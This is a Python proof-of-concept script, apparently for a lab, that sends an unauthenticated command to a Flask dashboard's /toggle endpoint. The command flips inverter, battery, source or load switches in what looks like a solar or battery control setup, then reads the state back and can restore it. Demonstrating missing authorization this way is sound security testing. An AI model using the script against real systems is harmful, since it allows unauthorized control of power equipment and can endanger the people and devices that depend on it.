import argparse
import requests
import time

VALID_NODES = {
    "load_sw": "MPPT/DC load switch",
    "source_sw": "energy source switch",
    "batt_sw": "battery switch",
    "inv_sw": "inverter/AC load switch",
}

def pretty_state(data):
    if not isinstance(data, dict):
        return

    for node in VALID_NODES:
        if node in data:
            print(f"  {node:10s} = {data[node]}")

def main():
    parser = argparse.ArgumentParser(
        description="Controlled lab demo: send one unauthorized control command to the Flask /toggle endpoint."
    )
    parser.add_argument(
        "--base",
        default="http://127.0.0.1:5000",
        help="Base URL of the Flask dashboard, example: http://127.0.0.1:5000"
    )
    parser.add_argument(
        "--node",
        default="inv_sw",
        choices=VALID_NODES.keys(),
        help="Control node to toggle"
    )
    parser.add_argument(
        "--restore-after",
        type=float,
        default=0,
        help="Toggle the same node again after N seconds to restore the previous state"
    )

    args = parser.parse_args()
    base = args.base.rstrip("/")

    with requests.Session() as s:
        print("[*] Checking whether dashboard requires login...")
        dash = s.get(f"{base}/dashboard", allow_redirects=False, timeout=5)

        if dash.status_code in (301, 302, 303, 307, 308):
            print("[+] Dashboard is protected; unauthenticated request was redirected.")
        else:
            print(f"[!] Dashboard returned HTTP {dash.status_code}. Check whether login is actually enforced.")

        print("\n[*] Reading current public /data state...")
        try:
            before = s.get(f"{base}/data", timeout=5).json()
            pretty_state(before)
        except Exception as e:
            print(f"[!] Could not read /data: {e}")

        print(f"\n[*] Sending unauthorized control command:")
        print(f"    Target node: {args.node} ({VALID_NODES[args.node]})")

        r = s.post(
            f"{base}/toggle",
            json={"node": args.node},
            timeout=5
        )

        print(f"[+] /toggle HTTP status: {r.status_code}")
        print(f"[+] Response: {r.text}")

        print("\n[*] Reading state after command...")
        try:
            after = s.get(f"{base}/data", timeout=5).json()
            pretty_state(after)
        except Exception as e:
            print(f"[!] Could not read /data after toggle: {e}")

        if args.restore_after > 0:
            print(f"\n[*] Restoring previous state in {args.restore_after} seconds...")
            time.sleep(args.restore_after)

            r2 = s.post(
                f"{base}/toggle",
                json={"node": args.node},
                timeout=5
            )

            print(f"[+] Restore /toggle HTTP status: {r2.status_code}")
            print(f"[+] Restore response: {r2.text}")

if __name__ == "__main__":
    main()
    